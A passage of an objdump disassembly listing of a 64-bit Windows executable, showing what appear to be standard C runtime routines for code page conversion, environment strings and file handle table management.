   140009627:	48 83 c4 40          	add    $0x40,%rsp
   14000962b:	5f                   	pop    %rdi
   14000962c:	c3                   	ret
   14000962d:	cc                   	int3
   14000962e:	cc                   	int3
   14000962f:	cc                   	int3
   140009630:	8b d1                	mov    %ecx,%edx
   140009632:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140009638:	33 c9                	xor    %ecx,%ecx
   14000963a:	45 33 c0             	xor    %r8d,%r8d
   14000963d:	e9 76 ff ff ff       	jmp    0x1400095b8
   140009642:	cc                   	int3
   140009643:	cc                   	int3
   140009644:	48 83 ec 28          	sub    $0x28,%rsp
   140009648:	ff 15 62 5d 00 00    	call   *0x5d62(%rip)        # 0x14000f3b0
   14000964e:	48 89 05 63 21 01 00 	mov    %rax,0x12163(%rip)        # 0x14001b7b8
   140009655:	ff 15 5d 5d 00 00    	call   *0x5d5d(%rip)        # 0x14000f3b8
   14000965b:	48 89 05 5e 21 01 00 	mov    %rax,0x1215e(%rip)        # 0x14001b7c0
   140009662:	b0 01                	mov    $0x1,%al
   140009664:	48 83 c4 28          	add    $0x28,%rsp
   140009668:	c3                   	ret
   140009669:	cc                   	int3
   14000966a:	cc                   	int3
   14000966b:	cc                   	int3
   14000966c:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   140009672:	77 20                	ja     0x140009694
   140009674:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   14000967a:	83 f8 09             	cmp    $0x9,%eax
   14000967d:	77 0c                	ja     0x14000968b
   14000967f:	41 ba a7 02 00 00    	mov    $0x2a7,%r10d
   140009685:	41 0f a3 c2          	bt     %eax,%r10d
   140009689:	72 05                	jb     0x140009690
   14000968b:	83 f9 2a             	cmp    $0x2a,%ecx
   14000968e:	75 2f                	jne    0x1400096bf
   140009690:	33 d2                	xor    %edx,%edx
   140009692:	eb 2b                	jmp    0x1400096bf
   140009694:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   14000969a:	74 20                	je     0x1400096bc
   14000969c:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   1400096a2:	76 1b                	jbe    0x1400096bf
   1400096a4:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   1400096aa:	76 e4                	jbe    0x140009690
   1400096ac:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   1400096b2:	74 dc                	je     0x140009690
   1400096b4:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   1400096ba:	75 03                	jne    0x1400096bf
   1400096bc:	83 e2 08             	and    $0x8,%edx
   1400096bf:	48 ff 25 fa 5c 00 00 	rex.W jmp *0x5cfa(%rip)        # 0x14000f3c0
   1400096c6:	cc                   	int3
   1400096c7:	cc                   	int3
   1400096c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400096cd:	57                   	push   %rdi
   1400096ce:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   1400096d4:	45 8b d9             	mov    %r9d,%r11d
   1400096d7:	83 f8 01             	cmp    $0x1,%eax
   1400096da:	49 8b d8             	mov    %r8,%rbx
   1400096dd:	41 0f 96 c2          	setbe  %r10b
   1400096e1:	33 ff                	xor    %edi,%edi
   1400096e3:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   1400096e9:	77 1c                	ja     0x140009707
   1400096eb:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   1400096f1:	83 f8 09             	cmp    $0x9,%eax
   1400096f4:	77 0c                	ja     0x140009702
   1400096f6:	41 b8 a7 02 00 00    	mov    $0x2a7,%r8d
   1400096fc:	41 0f a3 c0          	bt     %eax,%r8d
   140009700:	72 33                	jb     0x140009735
   140009702:	83 f9 2a             	cmp    $0x2a,%ecx
   140009705:	eb 26                	jmp    0x14000972d
   140009707:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   14000970d:	74 26                	je     0x140009735
   14000970f:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   140009715:	76 18                	jbe    0x14000972f
   140009717:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   14000971d:	76 16                	jbe    0x140009735
   14000971f:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   140009725:	74 0e                	je     0x140009735
   140009727:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   14000972d:	74 06                	je     0x140009735
   14000972f:	0f ba f2 07          	btr    $0x7,%edx
   140009733:	eb 02                	jmp    0x140009737
   140009735:	8b d7                	mov    %edi,%edx
   140009737:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000973c:	45 84 d2             	test   %r10b,%r10b
   14000973f:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140009744:	4c 8b c0             	mov    %rax,%r8
   140009747:	4c 0f 45 c7          	cmovne %rdi,%r8
   14000974b:	4c 0f 45 cf          	cmovne %rdi,%r9
   14000974f:	74 07                	je     0x140009758
   140009751:	48 85 c0             	test   %rax,%rax
   140009754:	74 02                	je     0x140009758
   140009756:	89 38                	mov    %edi,(%rax)
   140009758:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   14000975d:	4c 8b c3             	mov    %rbx,%r8
   140009760:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   140009765:	45 8b cb             	mov    %r11d,%r9d
   140009768:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000976d:	5f                   	pop    %rdi
   14000976e:	48 ff 25 d3 59 00 00 	rex.W jmp *0x59d3(%rip)        # 0x14000f148
   140009775:	cc                   	int3
   140009776:	cc                   	int3
   140009777:	cc                   	int3
   140009778:	48 8b c4             	mov    %rsp,%rax
   14000977b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000977f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140009783:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140009787:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000978b:	41 56                	push   %r14
   14000978d:	48 83 ec 40          	sub    $0x40,%rsp
   140009791:	ff 15 31 5c 00 00    	call   *0x5c31(%rip)        # 0x14000f3c8
   140009797:	45 33 f6             	xor    %r14d,%r14d
   14000979a:	48 8b d8             	mov    %rax,%rbx
   14000979d:	48 85 c0             	test   %rax,%rax
   1400097a0:	0f 84 a4 00 00 00    	je     0x14000984a
   1400097a6:	48 8b f0             	mov    %rax,%rsi
   1400097a9:	66 44 39 30          	cmp    %r14w,(%rax)
   1400097ad:	74 1c                	je     0x1400097cb
   1400097af:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400097b3:	48 ff c0             	inc    %rax
   1400097b6:	66 44 39 34 46       	cmp    %r14w,(%rsi,%rax,2)
   1400097bb:	75 f6                	jne    0x1400097b3
   1400097bd:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   1400097c1:	48 83 c6 02          	add    $0x2,%rsi
   1400097c5:	66 44 39 36          	cmp    %r14w,(%rsi)
   1400097c9:	75 e4                	jne    0x1400097af
   1400097cb:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400097d0:	48 2b f3             	sub    %rbx,%rsi
   1400097d3:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400097d8:	48 83 c6 02          	add    $0x2,%rsi
   1400097dc:	48 d1 fe             	sar    $1,%rsi
   1400097df:	4c 8b c3             	mov    %rbx,%r8
   1400097e2:	44 8b ce             	mov    %esi,%r9d
   1400097e5:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400097ea:	33 d2                	xor    %edx,%edx
   1400097ec:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400097f1:	33 c9                	xor    %ecx,%ecx
   1400097f3:	e8 d0 fe ff ff       	call   0x1400096c8
   1400097f8:	48 63 e8             	movslq %eax,%rbp
   1400097fb:	85 c0                	test   %eax,%eax
   1400097fd:	74 4b                	je     0x14000984a
   1400097ff:	48 8b cd             	mov    %rbp,%rcx
   140009802:	e8 41 e6 ff ff       	call   0x140007e48
   140009807:	48 8b f8             	mov    %rax,%rdi
   14000980a:	48 85 c0             	test   %rax,%rax
   14000980d:	74 2e                	je     0x14000983d
   14000980f:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140009814:	44 8b ce             	mov    %esi,%r9d
   140009817:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   14000981c:	4c 8b c3             	mov    %rbx,%r8
   14000981f:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140009823:	33 d2                	xor    %edx,%edx
   140009825:	33 c9                	xor    %ecx,%ecx
   140009827:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000982c:	e8 97 fe ff ff       	call   0x1400096c8
   140009831:	85 c0                	test   %eax,%eax
   140009833:	74 08                	je     0x14000983d
   140009835:	48 8b f7             	mov    %rdi,%rsi
   140009838:	49 8b fe             	mov    %r14,%rdi
   14000983b:	eb 03                	jmp    0x140009840
   14000983d:	49 8b f6             	mov    %r14,%rsi
   140009840:	48 8b cf             	mov    %rdi,%rcx
   140009843:	e8 d8 e6 ff ff       	call   0x140007f20
   140009848:	eb 03                	jmp    0x14000984d
   14000984a:	49 8b f6             	mov    %r14,%rsi
   14000984d:	48 85 db             	test   %rbx,%rbx
   140009850:	74 09                	je     0x14000985b
   140009852:	48 8b cb             	mov    %rbx,%rcx
   140009855:	ff 15 75 5b 00 00    	call   *0x5b75(%rip)        # 0x14000f3d0
   14000985b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009860:	48 8b c6             	mov    %rsi,%rax
   140009863:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140009868:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000986d:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140009872:	48 83 c4 40          	add    $0x40,%rsp
   140009876:	41 5e                	pop    %r14
   140009878:	c3                   	ret
   140009879:	cc                   	int3
   14000987a:	cc                   	int3
   14000987b:	cc                   	int3
   14000987c:	40 53                	rex push %rbx
   14000987e:	48 83 ec 20          	sub    $0x20,%rsp
   140009882:	33 db                	xor    %ebx,%ebx
   140009884:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140009888:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   14000988f:	00 00 
   140009891:	48 8b 48 20          	mov    0x20(%rax),%rcx
   140009895:	39 59 08             	cmp    %ebx,0x8(%rcx)
   140009898:	7c 11                	jl     0x1400098ab
   14000989a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000989f:	e8 94 e0 ff ff       	call   0x140007938
   1400098a4:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   1400098a9:	74 05                	je     0x1400098b0
   1400098ab:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400098b0:	8b c3                	mov    %ebx,%eax
   1400098b2:	48 83 c4 20          	add    $0x20,%rsp
   1400098b6:	5b                   	pop    %rbx
   1400098b7:	c3                   	ret
   1400098b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400098bd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400098c2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400098c7:	57                   	push   %rdi
   1400098c8:	48 83 ec 20          	sub    $0x20,%rsp
   1400098cc:	ba 48 00 00 00       	mov    $0x48,%edx
   1400098d1:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   1400098d4:	e8 cf e5 ff ff       	call   0x140007ea8
   1400098d9:	33 f6                	xor    %esi,%esi
   1400098db:	48 8b d8             	mov    %rax,%rbx
   1400098de:	48 85 c0             	test   %rax,%rax
   1400098e1:	74 5b                	je     0x14000993e
   1400098e3:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   1400098ea:	48 3b c5             	cmp    %rbp,%rax
   1400098ed:	74 4c                	je     0x14000993b
   1400098ef:	48 8d 78 30          	lea    0x30(%rax),%rdi
   1400098f3:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   1400098f7:	45 33 c0             	xor    %r8d,%r8d
   1400098fa:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400098ff:	e8 ec e1 ff ff       	call   0x140007af0
   140009904:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   140009909:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   14000990d:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   140009911:	8b c6                	mov    %esi,%eax
   140009913:	48 89 37             	mov    %rsi,(%rdi)
   140009916:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   14000991d:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   140009921:	40 88 31             	mov    %sil,(%rcx)
   140009924:	ff c0                	inc    %eax
   140009926:	48 ff c1             	inc    %rcx
   140009929:	83 f8 05             	cmp    $0x5,%eax
   14000992c:	72 f3                	jb     0x140009921
   14000992e:	48 83 c7 48          	add    $0x48,%rdi
   140009932:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   140009936:	48 3b c5             	cmp    %rbp,%rax
   140009939:	75 b8                	jne    0x1400098f3
   14000993b:	48 8b f3             	mov    %rbx,%rsi
   14000993e:	33 c9                	xor    %ecx,%ecx
   140009940:	e8 db e5 ff ff       	call   0x140007f20
   140009945:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000994a:	48 8b c6             	mov    %rsi,%rax
   14000994d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009952:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009957:	48 83 c4 20          	add    $0x20,%rsp
   14000995b:	5f                   	pop    %rdi
   14000995c:	c3                   	ret
   14000995d:	cc                   	int3
   14000995e:	cc                   	int3
   14000995f:	cc                   	int3
   140009960:	48 85 c9             	test   %rcx,%rcx
   140009963:	74 4a                	je     0x1400099af
   140009965:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000996a:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000996f:	57                   	push   %rdi
   140009970:	48 83 ec 20          	sub    $0x20,%rsp
   140009974:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   14000997b:	48 8b d9             	mov    %rcx,%rbx
   14000997e:	48 8b f9             	mov    %rcx,%rdi
   140009981:	48 3b ce             	cmp    %rsi,%rcx
   140009984:	74 12                	je     0x140009998
   140009986:	48 8b cf             	mov    %rdi,%rcx
   140009989:	ff 15 81 59 00 00    	call   *0x5981(%rip)        # 0x14000f310
   14000998f:	48 83 c7 48          	add    $0x48,%rdi
   140009993:	48 3b fe             	cmp    %rsi,%rdi
   140009996:	75 ee                	jne    0x140009986
   140009998:	48 8b cb             	mov    %rbx,%rcx
   14000999b:	e8 80 e5 ff ff       	call   0x140007f20
   1400099a0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400099a5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400099aa:	48 83 c4 20          	add    $0x20,%rsp
   1400099ae:	5f                   	pop    %rdi
   1400099af:	c3                   	ret
   1400099b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400099b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400099ba:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400099bf:	41 57                	push   %r15
   1400099c1:	48 83 ec 30          	sub    $0x30,%rsp
   1400099c5:	8b f1                	mov    %ecx,%esi
   1400099c7:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   1400099cd:	72 29                	jb     0x1400099f8
   1400099cf:	e8 6c dd ff ff       	call   0x140007740
   1400099d4:	bb 09 00 00 00       	mov    $0x9,%ebx
   1400099d9:	89 18                	mov    %ebx,(%rax)
   1400099db:	e8 40 dc ff ff       	call   0x140007620
   1400099e0:	8b c3                	mov    %ebx,%eax
   1400099e2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400099e7:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400099ec:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400099f1:	48 83 c4 30          	add    $0x30,%rsp
   1400099f5:	41 5f                	pop    %r15
   1400099f7:	c3                   	ret
   1400099f8:	33 ff                	xor    %edi,%edi
   1400099fa:	8d 4f 07             	lea    0x7(%rdi),%ecx
   1400099fd:	e8 d6 e3 ff ff       	call   0x140007dd8
   140009a02:	90                   	nop
   140009a03:	8b df                	mov    %edi,%ebx
   140009a05:	8b 05 c5 21 01 00    	mov    0x121c5(%rip),%eax        # 0x14001bbd0
   140009a0b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009a10:	3b f0                	cmp    %eax,%esi
   140009a12:	7c 36                	jl     0x140009a4a
   140009a14:	4c 8d 3d b5 1d 01 00 	lea    0x11db5(%rip),%r15        # 0x14001b7d0
   140009a1b:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   140009a1f:	74 02                	je     0x140009a23
   140009a21:	eb 22                	jmp    0x140009a45
   140009a23:	e8 90 fe ff ff       	call   0x1400098b8
   140009a28:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   140009a2c:	48 85 c0             	test   %rax,%rax
   140009a2f:	75 05                	jne    0x140009a36
   140009a31:	8d 78 0c             	lea    0xc(%rax),%edi
   140009a34:	eb 14                	jmp    0x140009a4a
   140009a36:	8b 05 94 21 01 00    	mov    0x12194(%rip),%eax        # 0x14001bbd0
   140009a3c:	83 c0 40             	add    $0x40,%eax
   140009a3f:	89 05 8b 21 01 00    	mov    %eax,0x1218b(%rip)        # 0x14001bbd0
   140009a45:	48 ff c3             	inc    %rbx
   140009a48:	eb c1                	jmp    0x140009a0b
   140009a4a:	b9 07 00 00 00       	mov    $0x7,%ecx
   140009a4f:	e8 d8 e3 ff ff       	call   0x140007e2c
   140009a54:	8b c7                	mov    %edi,%eax
   140009a56:	eb 8a                	jmp    0x1400099e2
   140009a58:	48 63 d1             	movslq %ecx,%rdx
   140009a5b:	4c 8d 05 6e 1d 01 00 	lea    0x11d6e(%rip),%r8        # 0x14001b7d0
   140009a62:	48 8b c2             	mov    %rdx,%rax
   140009a65:	83 e2 3f             	and    $0x3f,%edx
   140009a68:	48 c1 f8 06          	sar    $0x6,%rax
   140009a6c:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140009a70:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140009a74:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140009a78:	48 ff 25 81 58 00 00 	rex.W jmp *0x5881(%rip)        # 0x14000f300
   140009a7f:	cc                   	int3
   140009a80:	48 63 d1             	movslq %ecx,%rdx
   140009a83:	4c 8d 05 46 1d 01 00 	lea    0x11d46(%rip),%r8        # 0x14001b7d0
   140009a8a:	48 8b c2             	mov    %rdx,%rax
   140009a8d:	83 e2 3f             	and    $0x3f,%edx
   140009a90:	48 c1 f8 06          	sar    $0x6,%rax
   140009a94:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140009a98:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140009a9c:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140009aa0:	48 ff 25 61 58 00 00 	rex.W jmp *0x5861(%rip)        # 0x14000f308
   140009aa7:	cc                   	int3
   140009aa8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009aad:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009ab2:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140009ab7:	41 56                	push   %r14
   140009ab9:	48 83 ec 20          	sub    $0x20,%rsp
   140009abd:	48 63 d9             	movslq %ecx,%rbx
   140009ac0:	85 c9                	test   %ecx,%ecx
   140009ac2:	78 72                	js     0x140009b36
   140009ac4:	3b 1d 06 21 01 00    	cmp    0x12106(%rip),%ebx        # 0x14001bbd0
   140009aca:	73 6a                	jae    0x140009b36
   140009acc:	48 8b c3             	mov    %rbx,%rax
   140009acf:	4c 8d 35 fa 1c 01 00 	lea    0x11cfa(%rip),%r14        # 0x14001b7d0
   140009ad6:	83 e0 3f             	and    $0x3f,%eax
   140009ad9:	48 8b f3             	mov    %rbx,%rsi
   140009adc:	48 c1 fe 06          	sar    $0x6,%rsi
   140009ae0:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   140009ae4:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140009ae8:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   140009aed:	74 47                	je     0x140009b36
   140009aef:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140009af5:	74 3f                	je     0x140009b36
   140009af7:	e8 d4 bf ff ff       	call   0x140005ad0
   140009afc:	83 f8 01             	cmp    $0x1,%eax
   140009aff:	75 27                	jne    0x140009b28
   140009b01:	85 db                	test   %ebx,%ebx
   140009b03:	74 16                	je     0x140009b1b
   140009b05:	2b d8                	sub    %eax,%ebx
   140009b07:	74 0b                	je     0x140009b14
   140009b09:	3b d8                	cmp    %eax,%ebx
   140009b0b:	75 1b                	jne    0x140009b28
   140009b0d:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140009b12:	eb 0c                	jmp    0x140009b20
   140009b14:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140009b19:	eb 05                	jmp    0x140009b20
   140009b1b:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140009b20:	33 d2                	xor    %edx,%edx
   140009b22:	ff 15 b0 58 00 00    	call   *0x58b0(%rip)        # 0x14000f3d8
   140009b28:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140009b2c:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140009b32:	33 c0                	xor    %eax,%eax
   140009b34:	eb 16                	jmp    0x140009b4c
   140009b36:	e8 05 dc ff ff       	call   0x140007740
   140009b3b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009b41:	e8 da db ff ff       	call   0x140007720
   140009b46:	83 20 00             	andl   $0x0,(%rax)
   140009b49:	83 c8 ff             	or     $0xffffffff,%eax
   140009b4c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009b51:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009b56:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140009b5b:	48 83 c4 20          	add    $0x20,%rsp
   140009b5f:	41 5e                	pop    %r14
   140009b61:	c3                   	ret
   140009b62:	cc                   	int3
   140009b63:	cc                   	int3
   140009b64:	48 83 ec 28          	sub    $0x28,%rsp
   140009b68:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140009b6b:	75 15                	jne    0x140009b82
   140009b6d:	e8 ae db ff ff       	call   0x140007720
   140009b72:	83 20 00             	andl   $0x0,(%rax)
   140009b75:	e8 c6 db ff ff       	call   0x140007740
   140009b7a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009b80:	eb 4e                	jmp    0x140009bd0
   140009b82:	85 c9                	test   %ecx,%ecx
   140009b84:	78 32                	js     0x140009bb8
   140009b86:	3b 0d 44 20 01 00    	cmp    0x12044(%rip),%ecx        # 0x14001bbd0
   140009b8c:	73 2a                	jae    0x140009bb8
   140009b8e:	48 63 c9             	movslq %ecx,%rcx
   140009b91:	4c 8d 05 38 1c 01 00 	lea    0x11c38(%rip),%r8        # 0x14001b7d0
   140009b98:	48 8b c1             	mov    %rcx,%rax
   140009b9b:	83 e1 3f             	and    $0x3f,%ecx
   140009b9e:	48 c1 f8 06          	sar    $0x6,%rax
   140009ba2:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   140009ba6:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140009baa:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140009baf:	74 07                	je     0x140009bb8
   140009bb1:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   140009bb6:	eb 1c                	jmp    0x140009bd4
   140009bb8:	e8 63 db ff ff       	call   0x140007720
   140009bbd:	83 20 00             	andl   $0x0,(%rax)
   140009bc0:	e8 7b db ff ff       	call   0x140007740
   140009bc5:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009bcb:	e8 50 da ff ff       	call   0x140007620
   140009bd0:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140009bd4:	48 83 c4 28          	add    $0x28,%rsp
   140009bd8:	c3                   	ret
   140009bd9:	cc                   	int3
   140009bda:	cc                   	int3
   140009bdb:	cc                   	int3
   140009bdc:	8b 05 e6 1b 01 00    	mov    0x11be6(%rip),%eax        # 0x14001b7c8
   140009be2:	b9 00 40 00 00       	mov    $0x4000,%ecx
   140009be7:	85 c0                	test   %eax,%eax
   140009be9:	0f 44 c1             	cmove  %ecx,%eax
   140009bec:	89 05 d6 1b 01 00    	mov    %eax,0x11bd6(%rip)        # 0x14001b7c8
   140009bf2:	33 c0                	xor    %eax,%eax
   140009bf4:	c3                   	ret
   140009bf5:	cc                   	int3
   140009bf6:	cc                   	int3
   140009bf7:	cc                   	int3
   140009bf8:	48 8b c4             	mov    %rsp,%rax
   140009bfb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009bff:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140009c03:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140009c07:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009c0b:	41 56                	push   %r14
   140009c0d:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140009c14:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   140009c18:	ff 15 ba 56 00 00    	call   *0x56ba(%rip)        # 0x14000f2d8
   140009c1e:	45 33 f6             	xor    %r14d,%r14d
   140009c21:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   140009c27:	0f 84 9a 00 00 00    	je     0x140009cc7
   140009c2d:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140009c32:	48 85 c0             	test   %rax,%rax
   140009c35:	0f 84 8c 00 00 00    	je     0x140009cc7
   140009c3b:	48 63 18             	movslq (%rax),%rbx
   140009c3e:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140009c42:	bf 00 20 00 00       	mov    $0x2000,%edi
   140009c47:	48 03 de             	add    %rsi,%rbx
   140009c4a:	39 38                	cmp    %edi,(%rax)
   140009c4c:	0f 4c 38             	cmovl  (%rax),%edi
   140009c4f:	8b cf                	mov    %edi,%ecx
   140009c51:	e8 5a fd ff ff       	call   0x1400099b0
   140009c56:	3b 3d 74 1f 01 00    	cmp    0x11f74(%rip),%edi        # 0x14001bbd0
   140009c5c:	0f 4f 3d 6d 1f 01 00 	cmovg  0x11f6d(%rip),%edi        # 0x14001bbd0
   140009c63:	85 ff                	test   %edi,%edi
   140009c65:	74 60                	je     0x140009cc7
   140009c67:	41 8b ee             	mov    %r14d,%ebp
   140009c6a:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140009c6e:	74 47                	je     0x140009cb7
   140009c70:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140009c74:	74 41                	je     0x140009cb7
   140009c76:	f6 06 01             	testb  $0x1,(%rsi)
   140009c79:	74 3c                	je     0x140009cb7
   140009c7b:	f6 06 08             	testb  $0x8,(%rsi)
   140009c7e:	75 0d                	jne    0x140009c8d
   140009c80:	48 8b 0b             	mov    (%rbx),%rcx
   140009c83:	ff 15 57 57 00 00    	call   *0x5757(%rip)        # 0x14000f3e0
   140009c89:	85 c0                	test   %eax,%eax
   140009c8b:	74 2a                	je     0x140009cb7
   140009c8d:	48 8b c5             	mov    %rbp,%rax
   140009c90:	4c 8d 05 39 1b 01 00 	lea    0x11b39(%rip),%r8        # 0x14001b7d0
   140009c97:	48 8b cd             	mov    %rbp,%rcx
   140009c9a:	48 c1 f9 06          	sar    $0x6,%rcx
   140009c9e:	83 e0 3f             	and    $0x3f,%eax
   140009ca1:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   140009ca5:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140009ca9:	48 8b 03             	mov    (%rbx),%rax
   140009cac:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140009cb1:	8a 06                	mov    (%rsi),%al
   140009cb3:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   140009cb7:	48 ff c5             	inc    %rbp
   140009cba:	48 ff c6             	inc    %rsi
   140009cbd:	48 83 c3 08          	add    $0x8,%rbx
   140009cc1:	48 83 ef 01          	sub    $0x1,%rdi
   140009cc5:	75 a3                	jne    0x140009c6a
   140009cc7:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140009cce:	00 
   140009ccf:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140009cd3:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140009cd7:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140009cdb:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140009cdf:	49 8b e3             	mov    %r11,%rsp
   140009ce2:	41 5e                	pop    %r14
   140009ce4:	c3                   	ret
   140009ce5:	cc                   	int3
   140009ce6:	cc                   	int3
   140009ce7:	cc                   	int3
   140009ce8:	48 8b c4             	mov    %rsp,%rax
   140009ceb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009cef:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140009cf3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140009cf7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009cfb:	41 56                	push   %r14
   140009cfd:	48 83 ec 20          	sub    $0x20,%rsp
